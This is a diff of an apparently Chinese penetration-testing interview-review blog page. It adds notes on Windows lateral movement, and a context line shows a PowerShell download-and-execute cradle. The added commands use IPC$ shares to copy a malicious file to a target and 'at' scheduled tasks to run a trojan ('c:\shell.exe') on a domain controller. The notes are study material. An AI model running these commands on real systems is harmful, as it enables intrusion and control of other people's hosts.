@@ -406,21 +406,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-03-21
+                    2024-03-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.8k
+                    3.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    12 分
                 </div>
                 
 
@@ -545,7 +545,30 @@ powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstrin
 </code></pre>
 <h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>  用于备份证书服务，由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。<br>  目录为：<code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code><br><a href="https://smms.app/image/Ki24ZBd6l3vqWme" target="_blank"><img src="https://s2.loli.net/2024/03/21/Ki24ZBd6l3vqWme.png" ></a></p>
 <h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><p><code>wget -b -O filename http://example.com</code>默认覆盖文件</p>
-<h4 id="ipc-文件共享"><a href="#ipc-文件共享" class="headerlink" title="ipc$文件共享"></a>ipc$文件共享</h4><p>  IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问</p>
+<h4 id="ipc-文件共享"><a href="#ipc-文件共享" class="headerlink" title="ipc$文件共享"></a>ipc$文件共享</h4><p>  IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。<br>  <strong>漏洞利用条件：</strong><br>  目标主机开启了139和445端口<br>  目标主机管理员开启了ipc$默认共享</p>
+<pre><code>
+net use \\DC的IP\ipc$ &quot;password&quot; /user:&quot;username&quot;   //连接主机
+net use   // 查看当前主机所建立的连接
+dir \\ip\c$   //查看主机目录
+copy 本地文件地址 \\目标\c$   //传输恶意文件
+tasklist /S 主机 /U 用户 /P 密码   // 查看目标主机进程
+net use \\IP /del /y   //删除ipc$
+
+&gt;&gt;建立 IPC 常见的错误代码:
+5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 
+51：网络问题，Windows 无法找到网络路径
+53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题
+67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$
+1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除
+1326：账号密码错误
+1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况
+2242：用户密码过期，目标有账号策略，强制定期更改密码
+</code></pre>
+<h4 id="at计划任务"><a href="#at计划任务" class="headerlink" title="at计划任务"></a>at计划任务</h4><p>Windows Server 2008之前版本的操作系统中。我们可以通过at命令通过跳板机在目标主机DC上创建一次性计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。</p>
+<pre><code>copy 本地文件地址 \\目标\c$   //传输恶意文件
+at \\ip 18:53:00 c:\shell.exe   //创建计划任务，让目标主机DC在指定的时间运行木马
+at \\ip 任务ID /delete   //删除任务
+</code></pre>
 <h2 id="手工判断靶标站点是Windows-Linux"><a href="#手工判断靶标站点是Windows-Linux" class="headerlink" title="手工判断靶标站点是Windows/Linux"></a>手工判断靶标站点是Windows/Linux</h2><ol>
 <li>大小写检测：Windows大小写不敏感，而Liunx大小写敏感</li>
 <li>PING指令: 根据TTL值，Windows一般情况下&gt;100、Linux则&lt;100</li>
@@ -916,18 +939,17 @@ powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstrin
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="">
+                <a href="../../22/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%89/">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/18.jpg" class="responsive-img" alt="面试复习二">
+                        <img src="../../../../medias/featureimages/5.jpg" class="responsive-img" alt="面试复习三">
                         
-                        <span class="card-title">面试复习二</span>
+                        <span class="card-title">面试复习三</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -937,9 +959,9 @@ powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstrin
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-21
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-03-22
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -952,7 +974,6 @@ powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstrin
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -1208,7 +1229,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">151.9k</span>
+                        class="white-color">153.4k</span>
             
             
             
